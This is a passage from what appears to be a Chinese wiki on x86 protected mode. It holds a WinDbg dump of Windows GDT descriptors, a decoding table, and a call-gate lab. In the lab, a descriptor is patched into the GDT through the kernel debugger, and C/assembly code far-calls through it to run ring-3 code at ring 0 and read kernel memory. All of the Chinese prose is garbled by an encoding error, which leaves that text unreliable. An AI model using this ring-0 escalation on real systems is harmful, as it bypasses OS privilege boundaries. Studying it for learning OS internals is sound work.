ff0092ff`700003ff 80009a40`0000ffff8003f080 80009240`0000ffff 00009200`000000008003f090 00000000`00000000 00000000`000000008003f0a0 00000000`00000000 00000000`000000008003f0b0 00000000`00000000 00000000`000000008003f0c0 00000000`00000000 00000000`000000008003f0d0 00000000`00000000 00000000`000000008003f0e0 00000000`8003f100 00009200`0000ffff8003f0f0 8000984f`b68803b7 00009200`0000ffff8003f100 00000000`8003f108 00000000`8003f1108003f110 00000000`8003f118 00000000`8003f1208003f120 00000000`8003f128 00000000`8003f1308003f130 00000000`8003f138 00000000`8003f1408003f140 00000000`8003f148 00000000`8003f1508003f150 00000000`8003f158 00000000`8003f1608003f160 00000000`8003f168 00000000`8003f1708003f170 00000000`8003f178 00000000`8003f1808003f180 00000000`8003f188 00000000`8003f1908003f190 00000000`8003f198 00000000`8003f1a08003f1a0 00000000`8003f1a8 00000000`8003f1b08003f1b0 00000000`8003f1b8 00000000`8003f1c08003f1c0 00000000`8003f1c8 00000000`8003f1d08003f1d0 00000000`8003f1d8 00000000`8003f1e08003f1e0 00000000`8003f1e8 00000000`8003f1f08003f1f0 00000000`8003f1f8 00000000`8003f2008003f200 00000000`8003f208 00000000`8003f2108003f210 00000000`8003f218 00000000`8003f2208003f220 00000000`8003f228 00000000`8003f2308003f230 00000000`8003f238 00000000`8003f2408003f240 00000000`8003f248 00000000`8003f2508003f250 00000000`8003f258 00000000`8003f2608003f260 00000000`8003f268 00000000`8003f2708003f270 00000000`8003f278 00000000`8003f2808003f280 00000000`8003f288 00000000`8003f2908003f290 00000000`8003f298 00000000`8003f2a08003f2a0 00000000`8003f2a8 00000000`8003f2b08003f2b0 00000000`8003f2b8 00000000`8003f2c08003f2c0 00000000`8003f2c8 00000000`8003f2d08003f2d0 00000000`8003f2d8 00000000`8003f2e08003f2e0 00000000`8003f2e8 00000000`8003f2f08003f2f0 00000000`8003f2f8 00000000`8003f3008003f300 00000000`8003f308 00000000`8003f3108003f310 00000000`8003f318 00000000`8003f3208003f320 00000000`8003f328 00000000`8003f3308003f330 00000000`8003f338 00000000`8003f3408003f340 00000000`8003f348 00000000`8003f3508003f350 00000000`8003f358 00000000`8003f3608003f360 00000000`8003f368 00000000`8003f3708003f370 00000000`8003f378 00000000`8003f3808003f380 00000000`8003f388 00000000`8003f3908003f390 00000000`8003f398 00000000`8003f3a08003f3a0 00000000`8003f3a8 00000000`8003f3b08003f3b0 00000000`8003f3b8 00000000`8003f3c08003f3c0 00000000`8003f3c8 00000000`8003f3d08003f3d0 00000000`8003f3d8 00000000`8003f3e08003f3e0 00000000`8003f3e8 00000000`8003f3f08003f3f0 00000000`8003f3f8 00000000`00000000åºå·åœ°å€æ®µæè¿°ç¬¦Pä½æœ‰æ•ˆoræ— æ•ˆSä½TYPEåŸŸï¼ˆç¬¬ä¸‰ä¸ªåå…­è¿›åˆ¶æ•°ï¼‰æ•°æ®æ®µorä»£ç æ®µE/CW/RAå±æ€§ç³»ç»Ÿæ®µå±æ€§08003f00000000000`000000000æ— æ•ˆ018003f00800cf9b00`0000ffff1æœ‰æ•ˆ1â‰¥8ï¼Œ1011ä»£ç æ®µ011å¯æ‰§è¡Œï¼Œéä¸€è‡´ä»£ç æ®µï¼Œå¯è¯»ï¼Œè®¿é—®è¿‡28003f01000cf9300`0000ffff1æœ‰æ•ˆ1ï¼œ8ï¼Œ0011æ•°æ®æ®µ011expand-upï¼Œå¯å†™ï¼Œè®¿é—®è¿‡38003f01800cffa00`0000ffff1æœ‰æ•ˆ1â‰¥8ï¼Œ1010ä»£ç æ®µ010å¯æ‰§è¡Œï¼Œéä¸€è‡´ä»£ç æ®µï¼Œå¯è¯»ï¼Œæœªè®¿é—®è¿‡48003f02000cff300`0000ffff1æœ‰æ•ˆ1ï¼œ8ï¼Œ0011æ•°æ®æ®µ011expand-upï¼Œå¯å†™ï¼Œè®¿é—®è¿‡58003f02880008b04`200020ab1æœ‰æ•ˆ01011ç³»ç»Ÿæ®µ32-Bit TSS(Busy)68003f030ffc093df`f00000011æœ‰æ•ˆ1ï¼œ8ï¼Œ0011æ•°æ®æ®µ011expand-upï¼Œå¯å†™ï¼Œè®¿é—®è¿‡78003f0380040f300`00000fff1æœ‰æ•ˆ1ï¼œ8ï¼Œ0011æ•°æ®æ®µ011expand-upï¼Œå¯å†™ï¼Œè®¿é—®è¿‡88003f0400000f200`0400ffff1æœ‰æ•ˆ1ï¼œ8ï¼Œ0010æ•°æ®æ®µ010expand-upï¼Œå¯å†™ï¼Œæœªè®¿é—®è¿‡98003f04800000000`000000000æ— æ•ˆ0108003f05080008954`af0000681æœ‰æ•ˆ01001ç³»ç»Ÿæ®µ32-Bit TSS(Avaliable)118003f05880008954`af6800681æœ‰æ•ˆ01001ç³»ç»Ÿæ®µ32-Bit TSS(Avaliable)128003f06000009302`2f40ffff1æœ‰æ•ˆ1ï¼œ8ï¼Œ0011æ•°æ®æ®µ011expand-upï¼Œå¯å†™ï¼Œè®¿é—®è¿‡138003f0680000920b`80003fff1æœ‰æ•ˆ1ï¼œ8ï¼Œ0010æ•°æ®æ®µ010expand-upï¼Œå¯å†™ï¼Œæœªè®¿é—®è¿‡148003f070ff0092ff`700003ff1æœ‰æ•ˆ1ï¼œ8ï¼Œ0010æ•°æ®æ®µ010expand-upï¼Œå¯å†™ï¼Œæœªè®¿é—®è¿‡158003f07880009a40`0000ffff1æœ‰æ•ˆ1â‰¥8ï¼Œ1010ä»£ç æ®µ010å¯æ‰§è¡Œï¼Œéä¸€è‡´ä»£ç æ®µï¼Œå¯è¯»ï¼Œæœªè®¿é—®è¿‡168003f08080009240`0000ffff1æœ‰æ•ˆ1ï¼œ8ï¼Œ0010æ•°æ®æ®µ010expand-upï¼Œå¯å†™ï¼Œæœªè®¿é—®è¿‡178003f08800009200`000000001æœ‰æ•ˆ1ï¼œ8ï¼Œ0010æ•°æ®æ®µ010expand-upï¼Œå¯å†™ï¼Œæœªè®¿é—®è¿‡188003f09000000000`000000000æ— æ•ˆ0198003f09800000000`000000000æ— æ•ˆ0208003f0a000000000`000000000æ— æ•ˆ0218003f0a800000000`000000000æ— æ•ˆ0228003f0b000000000`000000000æ— æ•ˆ0238003f0b800000000`000000000æ— æ•ˆ0248003f0c000000000`000000000æ— æ•ˆ0258003f0c800000000`000000000æ— æ•ˆ0268003f0d000000000`000000000æ— æ•ˆ0278003f0d800000000`000000000æ— æ•ˆ0288003f0e000000000`8003f1000æ— æ•ˆ0298003f0e800009200`0000ffff1æœ‰æ•ˆ1ï¼œ8ï¼Œ0010æ•°æ®æ®µ010expand-upï¼Œå¯å†™ï¼Œæœªè®¿é—®è¿‡308003f0f08000984f`b68803b71æœ‰æ•ˆ1â‰¥8ï¼Œ1000ä»£ç æ®µ000å¯æ‰§è¡Œï¼Œï¼Œéä¸€è‡´ä»£ç æ®µï¼Œä¸å¯è¯»ï¼Œæœªè®¿é—®è¿‡318003f0f800009200`0000ffff1æœ‰æ•ˆ1ï¼œ8ï¼Œ0010æ•°æ®æ®µ010expand-upï¼Œå¯å†™ï¼Œæœªè®¿é—®è¿‡328003f10000000000`8003f1080æ— æ•ˆ0338003f10800000000`8003f1100æ— æ•ˆ0348003f11000000000`8003f1180æ— æ•ˆ0358003f11800000000`8003f1200æ— æ•ˆ0368003f12000000000`8003f1280æ— æ•ˆ0378003f12800000000`8003f1300æ— æ•ˆ0388003f13000000000`8003f1380æ— æ•ˆ0398003f13800000000`8003f1400æ— æ•ˆ0408003f14000000000`8003f1480æ— æ•ˆ0418003f14800000000`8003f1500æ— æ•ˆ0428003f15000000000`8003f1580æ— æ•ˆ0438003f15800000000`8003f1600æ— æ•ˆ0448003f16000000000`8003f1680æ— æ•ˆ0458003f16800000000`8003f1700æ— æ•ˆ0468003f17000000000`8003f1780æ— æ•ˆ0478003f17800000000`8003f1800æ— æ•ˆ0488003f18000000000`8003f1880æ— æ•ˆ0498003f18800000000`8003f1900æ— æ•ˆ0508003f19000000000`8003f1980æ— æ•ˆ0518003f19800000000`8003f1a00æ— æ•ˆ0528003f1a000000000`8003f1a80æ— æ•ˆ0538003f1a800000000`8003f1b00æ— æ•ˆ0548003f1b000000000`8003f1b80æ— æ•ˆ0558003f1b800000000`8003f1c00æ— æ•ˆ0568003f1c000000000`8003f1c80æ— æ•ˆ0578003f1c800000000`8003f1d00æ— æ•ˆ0588003f1d000000000`8003f1d80æ— æ•ˆ0598003f1d800000000`8003f1e00æ— æ•ˆ0608003f1e000000000`8003f1e80æ— æ•ˆ0618003f1e800000000`8003f1f00æ— æ•ˆ0628003f1f000000000`8003f1f80æ— æ•ˆ0638003f1f800000000`8003f2000æ— æ•ˆ0648003f20000000000`8003f2080æ— æ•ˆ0658003f20800000000`8003f2100æ— æ•ˆ0668003f21000000000`8003f2180æ— æ•ˆ0678003f21800000000`8003f2200æ— æ•ˆ0688003f22000000000`8003f2280æ— æ•ˆ0698003f22800000000`8003f2300æ— æ•ˆ0708003f23000000000`8003f2380æ— æ•ˆ0718003f23800000000`8003f2400æ— æ•ˆ0728003f24000000000`8003f2480æ— æ•ˆ0738003f24800000000`8003f2500æ— æ•ˆ0748003f25000000000`8003f2580æ— æ•ˆ0758003f25800000000`8003f2600æ— æ•ˆ0768003f26000000000`8003f2680æ— æ•ˆ0778003f26800000000`8003f2700æ— æ•ˆ0788003f27000000000`8003f2780æ— æ•ˆ0798003f27800000000`8003f2800æ— æ•ˆ0808003f28000000000`8003f2880æ— æ•ˆ0818003f28800000000`8003f2900æ— æ•ˆ0828003f29000000000`8003f2980æ— æ•ˆ0838003f29800000000`8003f2a00æ— æ•ˆ0848003f2a000000000`8003f2a80æ— æ•ˆ0858003f2a800000000`8003f2b00æ— æ•ˆ0868003f2b000000000`8003f2b80æ— æ•ˆ0878003f2b800000000`8003f2c00æ— æ•ˆ0888003f2c000000000`8003f2c80æ— æ•ˆ0898003f2c800000000`8003f2d00æ— æ•ˆ0908003f2d000000000`8003f2d80æ— æ•ˆ0918003f2d800000000`8003f2e00æ— æ•ˆ0928003f2e000000000`8003f2e80æ— æ•ˆ0938003f2e800000000`8003f2f00æ— æ•ˆ0948003f2f000000000`8003f2f80æ— æ•ˆ0958003f2f80000000`8003f3000æ— æ•ˆ0968003f30000000000`8003f3080æ— æ•ˆ0978003f30800000000`8003f3100æ— æ•ˆ0988003f31000000000`8003f3180æ— æ•ˆ0998003f31800000000`8003f3200æ— æ•ˆ01008003f32000000000`8003f3280æ— æ•ˆ01018003f32800000000`8003f3300æ— æ•ˆ01028003f33000000000`8003f3380æ— æ•ˆ01038003f33800000000`8003f3400æ— æ•ˆ01048003f34000000000`8003f3480æ— æ•ˆ01058003f34800000000`8003f3500æ— æ•ˆ01068003f35000000000`8003f3580æ— æ•ˆ01078003f35800000000`8003f3600æ— æ•ˆ01088003f36000000000`8003f3680æ— æ•ˆ01098003f36800000000`8003f3700æ— æ•ˆ01108003f37000000000`8003f3780æ— æ•ˆ01118003f37800000000`8003f3800æ— æ•ˆ01128003f38000000000`8003f3880æ— æ•ˆ01138003f38800000000`8003f3900æ— æ•ˆ01148003f39000000000`8003f3980æ— æ•ˆ01158003f39800000000`8003f3a00æ— æ•ˆ01168003f3a000000000`8003f3a80æ— æ•ˆ01178003f3a800000000`8003f3b00æ— æ•ˆ01188003f3b000000000`8003f3b80æ— æ•ˆ01198003f3b800000000`8003f3c00æ— æ•ˆ01208003f3c000000000`8003f3c80æ— æ•ˆ01218003f3c800000000`8003f3d00æ— æ•ˆ01228003f3d000000000`8003f3d80æ— æ•ˆ01238003f3d800000000`8003f3e00æ— æ•ˆ01248003f3e000000000`8003f3e80æ— æ•ˆ01258003f3e800000000`8003f3f00æ— æ•ˆ01268003f3f000000000`8003f3f80æ— æ•ˆ01278003f3f800000000`000000000æ— æ•ˆ0æ²¡è§åˆ°æœ‰å‘ä¸‹æ‹“å±•çš„æ•°æ®æ®µã€‚å®é™…ä¸Šï¼Œwindowsç³»ç»Ÿå°±æ²¡ä½¿ç”¨å‘ä¸‹æ‹“å±•çš„æ•°æ®æ®µ"},{"title":"è°ƒç”¨é—¨","path":"/wiki/Protected_Mode/è°ƒç”¨é—¨.html","content":"é—¨æè¿°ç¬¦ To provide controlled access to code segments with different privilege levels, the processor provides special set of descriptors called gate descriptors. There are four kinds of gate descriptors: â€¢ Call gates â€¢ Trap gates â€¢ Interrupt gates â€¢ Task gates è°ƒç”¨é—¨ æè¿°ç¬¦å­—æ®µ På¿…é¡»=1ï¼Œè¡¨ç¤ºè¯¥æè¿°ç¬¦æœ‰æ•ˆã€‚ Så¿…é¡»=0ï¼Œè¡¨ç¤ºæ˜¯ç³»ç»Ÿæ®µã€‚ Typeæ˜¯1100ï¼Œè¡¨ç¤ºæ˜¯32bitè°ƒç”¨é—¨ã€‚ é«˜å­—èŠ‚7~5ï¼Œä¿ç•™å­—æ®µã€‚ Param Count 0~4ï¼ŒæŒ‡æ˜å‚æ•°çš„ä¸ªæ•°ï¼Œåœ¨æœ‰å †æ ˆåˆ‡æ¢æ—¶ä¼šå°†è¿™äº›å‚æ•°å‹å…¥æ–°çš„å †æ ˆä¸­ã€‚è°ƒç”¨é—¨æ— å‚æ—¶æ˜¯0ï¼›å¦‚æœè°ƒç”¨é—¨æœ‰å‚æ˜¯3ä¸ªå‚æ•°ï¼Œè¿™ä¸ªå­—æ®µå°±æ˜¯3ï¼ˆåå…­è¿›åˆ¶ï¼‰ è·³è½¬åæ–°æ®µçš„åç§»ç”±é«˜å­—èŠ‚31-16æ‹¼æ¥ä½å­—èŠ‚15-0ç»„æˆï¼ˆ32ä½åœ°å€ï¼‰ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨åEIPçš„ä½ç½®ã€‚ Segment Selectorï¼Œå­˜å‚¨äº†å¦ä¸€ä¸ªä»£ç æ®µçš„é€‰æ‹©å­ã€‚ è°ƒç”¨é—¨æ‰§è¡Œæµç¨‹ æŒ‡ä»¤æ ¼å¼ï¼š 1CALL CS:EIP æ­¥éª¤ï¼š CSå……å½“æ®µé€‰æ‹©å­ï¼ŒæŸ¥GDTè¡¨ï¼Œæ‰¾åˆ°çš„æ®µæè¿°ç¬¦æ˜¯ä¸€ä¸ªè°ƒç”¨é—¨ã€‚ æƒé™æ£€æŸ¥ã€‚éœ€è¦è°ƒç”¨è€…CPLçš„æƒé™ä¸ä½äºDPLï¼Œå³CPLâ‰¤DPLï¼ˆæ•°å€¼ä¸Šï¼‰ï¼Œçœ‹ä½ æ˜¯å¦æœ‰è®¿é—®è¯¥è°ƒç”¨é—¨çš„æƒé™ã€‚ è°ƒç”¨é—¨é‡Œçš„é€‰æ‹©å­æŒ‡å‘çš„å¦ä¸€ä¸ªæ®µæè¿°ç¬¦çš„Base+è°ƒç”¨é—¨çš„Offsetå°±æ˜¯è·³è½¬çš„ç›®æ ‡åœ°å€ï¼ŒCSçš„å€¼æœ€ç»ˆæ˜¯è°ƒç”¨é—¨æè¿°ç¬¦é‡ŒSegment Selectorçš„å€¼ï¼ˆæŒ‡å‘é—¨æè¿°ç¬¦çš„æ®µé€‰æ‹©å­ä¸èƒ½åŠ è½½åˆ°CSï¼Œé—¨åªæ˜¯ä¸€ä¸ªå…¥å£ï¼‰ å¦‚æœè°ƒç”¨è€…CPLï¼è°ƒç”¨é—¨ä¸­çš„æ®µé€‰æ‹©å­æŒ‡å‘ä»£ç æ®µçš„DPLï¼ˆæ•°å€¼ä¸Šï¼‰ï¼Œåˆ™ä¼šè‡ªåŠ¨ææƒã€‚æ¯”å¦‚è°ƒç”¨è€…æ˜¯3ç¯ç¨‹åºï¼Œä½¿ç”¨è°ƒç”¨é—¨åå˜æˆ0ç¯æƒé™ã€‚ï¼ˆä»£ç 3ç¯ï¼ŒRPLä»»æ„ï¼Œé—¨3ç¯ï¼Œé—¨å†…çš„ä»£ç æ®µ0ç¯ï¼Œåˆ™ä¼šè‡ªåŠ¨ææƒï¼‰ å¦‚æœè°ƒç”¨è€…CPLâ‰¤è°ƒç”¨é—¨ä¸­çš„æ®µé€‰æ‹©å­æŒ‡å‘ä»£ç æ®µçš„DPLï¼Œåˆ™ä¸ææƒã€‚ èƒ½å¦é€šè¿‡ä¿®æ”¹å †æ ˆçš„å€¼ï¼Œç„¶åretfææƒï¼Ÿå‚è€ƒè¯¥é“¾æ¥çš„ç»ƒä¹ 3ï¼šhttps://www.cnblogs.com/wingsummer/p/15353642.htmlä¸èƒ½ã€‚retfæ—¶å’Œè°ƒç”¨è°ƒç”¨é—¨æ—¶ä¸€æ ·ï¼Œä¼šæœ‰æƒé™æ£€æŸ¥ã€‚ç™½çš®ä¹¦ï¼šA far return that requires a privilege-level change is only allowed when returning to a less privileged level (that is,the DPL of the return code segment is numerically greater than the CPL).åªæœ‰åœ¨è¿”å›åˆ°è¾ƒä½æƒé™çº§åˆ«ï¼ˆå³è¿”å›ä»£ç æ®µçš„DPLåœ¨æ•°å­—ä¸Šå¤§äº CPLï¼‰æ—¶ï¼Œæ‰å…è®¸éœ€è¦æ›´æ”¹æƒé™çº§åˆ«çš„è¿œç¨‹è¿”å›ã€‚ å®éªŒ æ— å‚è°ƒç”¨é—¨ å®éªŒå†…å®¹ï¼šæ„é€ æ— å‚çš„è°ƒç”¨é—¨ï¼Œå®ç°ææƒååš3ä»¶äº‹ï¼šè¯»å–é«˜2Gçš„åœ°å€ï¼›åˆ†æå †æ ˆæƒ…å†µï¼›åˆ†æå¯„å­˜å™¨å˜åŒ–æƒ…å†µ å…·ä½“è¿‡ç¨‹æ„é€ è°ƒç”¨é—¨æè¿°ç¬¦å¹¶å†™å…¥GDTè¡¨å› ä¸ºwindowsçš„GDTè¡¨æ ¼é‡Œæ²¡æœ‰ç°æˆçš„è°ƒç”¨é—¨ï¼Œéœ€è¦è‡ªå·±ä¿®æ”¹GDTè¡¨ã€‚æ„é€ è¿‡ç¨‹ï¼šåç§»åœ°å€ï¼šé€šè¿‡VC++ï¼Œè°ƒè¯•æ—¶åæ±‡ç¼–å¾—åˆ°è£¸å‡½æ•°çš„åœ°å€ï¼Œé«˜ä½4å­—èŠ‚åˆ†åˆ«å¡«å†™åœ¨Offset in Segmentå› ä¸ºåœ¨windowsé‡Œï¼Œæ‰€æœ‰çš„æ•°æ®æ®µå’Œä»£ç æ®µbaseéƒ½æ˜¯0ã€‚æ‰€ä»¥è·³è½¬åçš„åœ°å€å°±æ˜¯é—¨æè¿°ç¬¦é‡Œçš„OffsetPå¿…é¡»=1ï¼Œè¡¨ç¤ºæè¿°ç¬¦æœ‰æ•ˆDPL=11ï¼Œå› ä¸ºå®éªŒæ—¶å†™çš„ç¨‹åºæ˜¯3ç¯çš„ï¼Œè¦è®©ç¨‹åºæœ‰æ•²é—¨çš„æƒé™Så¿…é¡»=0ï¼Œè¡¨ç¤ºæ˜¯ç³»ç»Ÿæ®µTypeå¿…é¡»=1100ï¼Œè¡¨ç¤ºæ˜¯è°ƒç”¨é—¨7~5ï¼Œä¿ç•™ï¼Œä¸º0Param Countï¼Œæ— å‚å®éªŒï¼Œä¸º0Segment Selectorå†™0008ï¼Œ0ç¯ä»£ç æ®µï¼Œææƒæ®µé€‰æ‹©å­ï¼šä¸ææƒ001Bï¼Œ3ç¯ä»£ç æ®µ0000 0000 0001 1 0 11ï¼ŒIndexä¸º3ææƒ0008ï¼Œ0ç¯ä»£ç æ®µ0000 0000 0000 1 0 00ï¼Œï¼ŒIndexä¸º1åºå·åœ°å€æ®µæè¿°ç¬¦æ•°æ®æ®µorä»£ç æ®µDPL18003f00800cf9b00`0000ffffä»£ç æ®µ0038003f01800cffa00`0000ffffä»£ç æ®µ11ç»¼ä¸Šï¼šé«˜å­—èŠ‚ï¼šæŒ‰æè¿°ç¬¦å­—æ®µï¼š0000000000000000 1 11 0 1100 000 00000å››ä½ä¸€ç»„ï¼š0000 0000 0000 0000 1110 1100 0000 0000åå…­è¿›åˆ¶ï¼š0000EC00ä½å­—èŠ‚ï¼š0008VC++æŸ¥çœ‹åˆ°åˆ‡æ¢å †æ ˆåçš„åœ°å€æ˜¯ï¼š0040 1020å®Œæ•´ï¼š0040EC00`00081020å°†è‡ªå·±æ„é€ çš„è°ƒç”¨é—¨åŠ å…¥GDTè¡¨ä¸­ï¼š1234567891011121314kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 00000000`00000000kd&gt; eq 8003f048 0040EC00`00081020kd&gt; dq 8003f000 LA8003f000 00000000`00000000 00cf9b00`0000ffff8003f010 00cf9300`0000ffff 00cffb00`0000ffff8003f020 00cff300`0000ffff 80008b04`200020ab8003f030 ffc093df`f0000001 0040f300`00000fff8003f040 0000f200`0400ffff 0040ec00`00081020kd&gt; gæµ‹è¯•ä»£ç 12345678910111213141516171819202122232425262728#include &lt;stdio.h&gt;#include &lt;windows.h&gt;//åˆ‡æ¢å †æ ˆåæ‰§è¡Œçš„ä»£ç void __declspec(naked) GetRegister()&#123; __asm &#123; int 3 //è™½ç„¶è¿™æ˜¯3ç¯ç¨‹åºï¼Œä½†é€šè¿‡è°ƒç”¨é—¨ææƒæ‰§è¡Œåˆ°è¿™è¡ŒæŒ‡ä»¤æ—¶æ˜¯0ç¯æƒé™ã€‚ //è¿™ä¸ªä¸­æ–­ï¼Œä¼šè¢«0ç¯è°ƒè¯•å™¨windbgæ•æ‰åˆ°ï¼ŒVC6çš„è°ƒè¯•å™¨æ˜¯æ–­ä¸ä¸‹æ¥çš„ï¼ˆåŸç†æ¶‰åŠåˆ°è°ƒè¯•æ–¹é¢çš„çŸ¥è¯†ï¼‰ retf //æ³¨æ„è¿”å›ï¼Œä¸èƒ½æ˜¯ret &#125;&#125;int main()&#123; char buff[6]; *(DWORD*)&amp;buff[0]=0x12345678; //ä½4å­—èŠ‚ï¼ŒEIPï¼Œå¯ä»¥éšä¾¿å†™ *(WORD*)&amp;buff[4]=0x48; //é«˜16ä½ï¼Œæ®µé€‰æ‹©å­ã€‚0x48æ‹†å®Œç´¢å¼•åˆ°çš„æ˜¯åˆšæ‰ä¿®æ”¹çš„8003f048ï¼Œä¸­æ–­é—¨æè¿°ç¬¦ __asm &#123; call fword ptr[buff]; //é•¿è°ƒç”¨ï¼Œéœ€è¦6ä¸ªå­—èŠ‚ &#125; getchar(); return 0;&#125;æ‰§è¡Œå‰ä¸­ååŠåˆ†ææ‰§è¡Œå‰æ‰§è¡Œæ—¶æ‰§è¡Œåå¯„å­˜å™¨å’Œå †æ ˆæƒ…å†µï¼šESP=0012FF28,CS=001B,SS=0023æ‰§è¡Œæ—¶ç°è±¡ï¼šæ“ä½œç³»ç»Ÿäº§ç”Ÿä¸­æ–­ï¼Œwindbgä¸­æ˜¾ç¤ºè¯¥æ“ä½œç³»ç»Ÿè¢«æ–­ä¸‹æ¥äº†å¯„å­˜å™¨å’Œå †æ ˆæƒ…å†µï¼šESP=b2362dd0,CS=8,SS=10csä¸º8ï¼Œæ˜¯ä¹‹å‰æ„é€ è°ƒç”¨é—¨æ—¶æ®µé€‰æ‹©å­çš„8ã€‚espæ˜¯bå¼€å¤´çš„ï¼Œæ¯”8å¤§äº†ï¼Œè¿™ä¸æ˜¯ä½2Gçš„ç©ºé—´ï¼Œè¿™æ˜¯0ç¯çš„å †æ ˆä¸‹é¢è¿™å¼ å›¾æ˜¯ç¬¬äºŒæ¬¡åšå®éªŒæˆªå›¾çš„ï¼Œéƒ¨åˆ†å¯„å­˜å™¨æ•°å€¼å¯èƒ½ä¸ä¸Šé¢çš„ä¸ä¸€æ ·ä¸‹ä¸¤ä¸ªæ–­ç‚¹ï¼Œè¿›å…¥è°ƒè¯•ï¼Œåˆ°ç¬¬ä¸€ä¸ªæ–­ç‚¹æ—¶VCçœ‹å¯„å­˜å™¨ï¼Œå•æ­¥æ‰§è¡Œï¼Œåœ¨è£¸å‡½æ•°int 3å¤„ä¼šåœ¨windbgé‡Œæ–­ä¸‹ï¼Œåœ¨windbgé‡ŒæŸ¥çœ‹å¯„å­˜å™¨ã€‚windbgè¾“å…¥gï¼Œå›åˆ°vcè°ƒè¯•ï¼ŒæŸ¥çœ‹å¯„å­˜å™¨ã€‚123 *(DWORD*)&amp;buff[0]=0x12345678; //ä½4å­—èŠ‚ï¼ŒEIPï¼Œå¯ä»¥éšä¾¿å†™getchar();å…¶ä»–å¯„å­˜å™¨ï¼Œæ¯”å¦‚ebx,ecx,edx,esi,edi,ebpdsã€esã€gséƒ½æ²¡å˜æµ·å“¥è¯´çš„ï¼šebpçš„å˜åŒ–å…¶å®ä¸æ˜¯å¿…é¡»çš„ã€‚ä½†æ˜¯æˆ‘å¯èƒ½æœ‰ç‚¹ç–‘æƒ‘ï¼Œå°±æ˜¯å‡½æ•°è°ƒç”¨æ—¶ä¸€èˆ¬ç”¨ebpå¯»å€ï¼Œå› ä¸ºebpæ¯”espå›ºå®šã€‚ä½†å®éªŒä¸‹æ¥ebpç¡®å®æ²¡å˜ã€‚ä¸€å¥—CPUï¼Œä¸€ä¸ªæ ¸ä¸€å¥—å¯„å­˜å™¨ã€‚è°ƒç”¨é—¨ææƒåï¼Œåªæ˜¯espæŒ‡å‘çš„åŒºåŸŸå˜äº†ï¼Œå³æ¢äº†å—å†…å­˜åŒºåŸŸä½¿ç”¨å †æ ˆã€‚å…¶ä»–å¯„å­˜å™¨å¹¶æ²¡æœ‰å˜åŒ–ï¼Œ3ç¯å’Œ0ç¯ä½¿ç”¨çš„æ˜¯åŒä¸€å¥—å¯„å­˜å™¨ã€‚å®éªŒä¸­è£¸å‡½æ•°é‡Œpushadå’Œpushfdæ˜¯å¦æ˜¯å¿…é¡»çš„ï¼Ÿæ³¨ï¼špushfdæŒ‡ä»¤æ˜¯æŠŠ32ä½EFLAGSå¯„å­˜å™¨å†…å®¹å‹å…¥å †æ ˆï¼ŒpopfdæŒ‡ä»¤æŠŠå †æ ˆå•å…ƒå†…å®¹å¼¹å‡ºåˆ°EFLAGESå¯„å­˜å™¨ã€‚pushadæŒ‡ä»¤æ˜¯å°†æ‰€æœ‰32ä½é€šç”¨å¯„å­˜å™¨å‹å…¥å †æ ˆï¼Œé¡ºåºæ˜¯eaxï¼Œecxï¼Œedxï¼Œebxï¼Œespï¼Œebpï¼Œesiå’Œediçš„é¡ºåºã€‚popadæŒ‡ä»¤æŒ‰ç›¸åé¡ºåºå°†å¯„å­˜å™¨å¼¹å‡ºå †æ ˆã€‚ä¸æ˜¯å¿…é¡»çš„ï¼Œçœ‹æƒ…å†µï¼Œä¸€èˆ¬å»ºè®®åŠ ä¸Šã€‚å› ä¸ºcallè°ƒç”¨å®Œå›å»åï¼Œè¿™äº›é€šç”¨å¯„å­˜å™¨å’Œæ ‡å¿—ä½åœ¨callé‡Œå¯èƒ½å˜äº†ã€‚callè°ƒç”¨å®Œåï¼Œå¦‚æœä½ ä¸æƒ³è®©è¿™äº›å˜åŒ–å½±å“åˆ°ä½¿ç”¨å®Œcallé‚£äº›åç»­æŒ‡ä»¤çš„æ‰§è¡Œã€‚å–å†³äºå¼€å‘è€…çš„ç”¨é€”å’Œç›®çš„å§ã€‚ä¿®æ”¹ä»£ç ï¼Œåœ¨0ç¯æ—¶è¯»å–é«˜2Gçš„åœ°å€æ‰§è¡Œåˆ°è£¸å‡½æ•°è¿™ä¸ªå‡½æ•°å—é‡Œæ—¶æ˜¯0ç¯æƒé™ï¼Œå†™å†…æ ¸ç¨‹åºä¸ä¼šæŠ¥é”™ä¸‹é¢è¿™æ®µä»£ç ç›¸æ¯”äºä¸Šä¸€æ®µï¼Œåœ¨è£¸å‡½æ•°é‡Œå¢åŠ äº†ï¼šè¯»é«˜2Gåœ°å€è¯»GDTRå¯„å­˜å™¨1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;stdio.h&gt;#include &lt;windows.h&gt;BYTE GDT[6]=&#123;0&#125;;DWORD dwH2GValue;//åˆ‡æ¢å †æ ˆåæ‰§è¡Œçš„ä»£ç void __declspec(naked) GetRegister()&#123; __asm &#123; //int 3 //è®©æ–­ç‚¹åœåœ¨windbgï¼Œè®©æˆ‘ä»¬åˆ†æä¸‹å¯„å­˜å™¨å’Œå †æ ˆ pushad pushfd mov eax,0x8003f00c //è¯»å–é«˜2Gçš„åœ°å€ mov ebx,[eax] mov dwH2GValue,ebx sgdt GDT //è¯»GDTRå¯„å­˜å™¨ popfd popad retf //æ³¨æ„è¿”å›ï¼Œä¸èƒ½æ˜¯ret &#125;&#125;void PrintRegister()&#123; DWORD GDT_ADDR=*(PDWORD)(&amp;GDT[2]); WORD GDT_LIMIT=*(PWORD)(&amp;GDT[0]); printf(&quot;%x %x %x &quot;,dwH2GValue,GDT_ADDR,GDT_LIMIT);&#125;int main()&#123; // __asm //è¿™é‡Œæˆ‘æ²¡çœ‹æ˜ç™½å¹²å˜›å‘¢ï¼Œæ³¨é‡Šæ‰VCç¼–è¯‘å°±ä¸æŠ¥é”™äº† // &#123; // mov ebx,ebx // mov ebx,ebx // &#125; char buff[6]; *(DWORD*)&amp;buff[0]=0x12345678; //ä½4å­—èŠ‚ï¼ŒEIPï¼Œå¯ä»¥éšä¾¿å†™ *(WORD*)&amp;buff[4]=0x48; //é«˜16ä½ï¼Œæ®µé€‰æ‹©å­ã€‚0x48æ‹†å®Œç´¢å¼•åˆ°çš„æ˜¯åˆšæ‰ä¿®æ”¹çš„8003f048ï¼Œä¸­æ–­é—¨æè¿°ç¬¦ __asm &#123; call fword ptr[buff]; //é•¿è°ƒç”¨ï¼Œéœ€è¦6ä¸ªå­—èŠ‚ &#125; PrintRegister(); 